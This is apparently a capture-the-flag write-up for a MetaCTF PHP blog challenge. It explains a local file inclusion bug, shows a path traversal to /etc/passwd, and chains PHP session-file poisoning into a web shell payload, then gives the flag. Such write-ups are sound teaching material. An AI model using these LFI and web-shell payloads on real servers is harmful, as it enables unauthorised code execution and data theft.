<h1>Custom Blog</h1>

<h2>Description</h2>

<blockquote>
  <p>This guy wrote his own blog in PHP instead of, I dunno, literally anything else. Can you teach him a lesson?</p>
</blockquote>

<p>{% file src="../../.gitbook/assets/source.zip" %}</p>

<h2>Solution</h2>

<p>The first thing to notice is that in <code>/post.php</code>, there is a local file inclusion (LFI) vulnerability.</p>

<p>```php
<?php
  session_start();</p>

<p>if (isset($<em>GET['post']) &amp;&amp; file</em>exists($post = 'posts/' . $<em>GET['post'])) {
    $ok = true;
  } else {
    $ok = false;
    http</em>response_code(404);
  }</p>

<p>...</p>

<p>if ($ok) {
    echo '<h1>' . htmlentities($_GET['post']) . '</h1><hr><div class="post">';
    include $post;
    echo '</div>';
  } else {
    echo '<h1>post not found :(</h1><hr>';
  }
  ...
?>
```</p>

<p>The <code>post</code> GET query parameter is used as the filename in the <code>include $post</code> statement. For instance, we could request <code>/post.php?post=../../../../../../etc/passwd</code>.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-12-07 at 7.39.34 PM.png" alt="" /></p>

<p>But what we really want is remote code execution (RCE). How do we do that? We need to be able to write to a file stored on the server, then include that file through the above LFI vulnerability.</p>

<p>After doing some research, I found that PHP sessions are file-based by default, and the filenames are pretty predictable - each user's session file is stored at <code>/tmp/sess_&lt;PHPSESSID&gt;</code>.&#x20;</p>

<p>If we look at <code>/set.php</code>, we can see that we are able to set the <code>theme</code> value in the session to any arbitrary string through the <code>theme</code> GET query parameter.</p>

<p>```php
<?php
  session_start();</p>

<p>if (isset($<em>GET['theme'])) {
    $</em>SESSION['theme'] = $_GET['theme'];
  }</p>

<p>header('Location: /');
  die();
?>
```</p>

<p>The session file can then be accessed through the LFI vulnerability, and our input is reflected into the included PHP code! For example, if we set our <code>theme</code> to <code>&lt;?php phpinfo() ?&gt;</code>, we get the following output when including our session file.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-12-07 at 7.52.03 PM.png" alt="" /></p>

<p>If we set the theme to the following PHP payload, we can get a web shell: <code>/set.php?theme=&lt;?php system($_GET['c']) ?&gt;</code></p>

<p><img src="../../.gitbook/assets/Screenshot 2021-12-07 at 7.53.46 PM.png" alt="" /></p>

<p>Explore the filesystem for a bit and you'll find the flag: <code>MetaCTF{wh4t??lfi_1s_ev0lv1ng??}</code></p>
